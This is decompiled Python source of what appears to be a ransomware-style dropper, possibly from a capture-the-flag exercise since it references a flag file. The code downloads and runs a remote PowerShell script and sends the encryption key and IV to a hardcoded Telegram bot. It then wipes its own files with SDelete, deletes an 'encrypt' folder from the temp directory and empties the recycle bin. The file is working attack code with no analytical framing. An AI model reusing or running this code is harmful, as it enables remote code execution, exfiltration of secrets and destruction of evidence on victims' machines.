# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: alo.py
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import requests
import subprocess
import zipfile
current_dir = os.path.dirname(os.path.abspath(__file__))
ps_script_url = 'https://raw.githubusercontent.com/TMQrX/temp/master/Qwertyu.ps1'
ps_script_path = os.path.join(current_dir, 'ps.ps1')
sdelete_zip_url = 'https://download.sysinternals.com/files/SDelete.zip'
sdelete_zip_path = os.path.join(current_dir, 'SDelete.zip')
sdelete_exe_path = os.path.join(current_dir, 'sdelete.exe')
flag_file_path = 'C:\\flag.txt'
temp_encrypt_folder = os.path.join(os.getenv('TEMP'), 'encrypt')

def download_file(url, destination):
    response = requests.get(url)
    with open(destination, 'wb') as file:
        file.write(response.content)

def extract_sdelete(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_to)

def execute_powershell_script(script_path):
    process = subprocess.run(['powershell.exe', '-File', script_path], capture_output=True, text=True)
    output = process.stdout.splitlines()
    if len(output) >= 2:
        cee = output[0].strip()
        vee = output[1].strip()
        return (cee, vee)
    return (None, None)

def send_to_telegram(key, iv, token, chat_id):
    message = f'Key: {key}\nIV: {iv}0'
    url = f'https://api.telegram.org/bot{token}0/sendMessage'
    data = {'chat_id': chat_id, 'text': message, 'protect_content': True}
    response = requests.post(url, data=data)

def securely_delete_files(ps_script_path, flag_file_path):
    if os.path.exists(ps_script_path):
        subprocess.run([sdelete_exe_path, ps_script_path], check=True)
    if os.path.exists(flag_file_path):
        subprocess.run([sdelete_exe_path, flag_file_path], check=True)

def delete_encrypt_folder(folder_path):
    if os.path.exists(folder_path):
        for root, dirs, files in os.walk(folder_path, topdown=False):
            for file in files:
                file_path = os.path.join(root, file)
                move_to_recycle_bin(file_path)
            for dir in dirs:
                dir_path = os.path.join(root, dir)
                move_to_recycle_bin(dir_path)
        move_to_recycle_bin(folder_path)

def move_to_recycle_bin(item_path):
    ps_command = f'\n    $shell = New-Object -ComObject Shell.Application\n    $folder = $shell.Namespace(0xA)\n    $folder.MoveHere("{item_path}0")\n    '
    subprocess.run(['powershell.exe', '-Command', ps_command], check=True)

def empty_recycle_bin():
    ps_command = '\n    $recycleBin = New-Object -ComObject Shell.Application\n    $binFolder = $recycleBin.Namespace(0xA)\n    $items = $binFolder.Items()\n    $items | ForEach-Object { Remove-Item $_.Path -Force -Recurse }\n    '
    subprocess.run(['powershell.exe', '-Command', ps_command], check=True)

def main():
    download_file(ps_script_url, ps_script_path)
    download_file(sdelete_zip_url, sdelete_zip_path)
    extract_sdelete(sdelete_zip_path, current_dir)
    cee, vee = execute_powershell_script(ps_script_path)
    if cee and vee:
        telegram_token = '7457737016:AAEvv7iDxEzpd9bxMmY9BBwZM0rE2e9Yef0'
        chat_id = '1617506446'
        send_to_telegram(cee, vee, telegram_token, chat_id)
    securely_delete_files(ps_script_path, flag_file_path)
    delete_encrypt_folder(temp_encrypt_folder)
    empty_recycle_bin()
if __name__ == '__main__':
    main()